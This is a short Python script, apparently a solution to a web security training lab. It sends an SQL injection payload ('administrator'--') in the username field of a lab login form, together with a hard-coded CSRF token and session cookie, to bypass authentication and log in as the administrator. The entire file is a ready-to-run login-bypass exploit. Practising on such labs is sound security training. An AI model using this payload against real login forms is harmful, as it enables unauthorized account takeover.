import requests

# Parâmetro vulnerável: login function

# PAYLOAD
sqli_1 = "administrator'--"

url = 'https://0ac20024036cf87780044ed300520037.web-security-academy.net/login'
data = {
    "csrf": "INE0h6D9g15QJTG3MLEkFU6SO3qTpPW7",
    "username": sqli_1,
    "password": "anything_pass"
}
headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}
cookies = {
    "session": "8kjb38MMLO5ZAyRaZI1XoPO3XRTgbXsw"
}
response = requests.post(url, headers=headers, cookies=cookies, data=data)

print(response.text)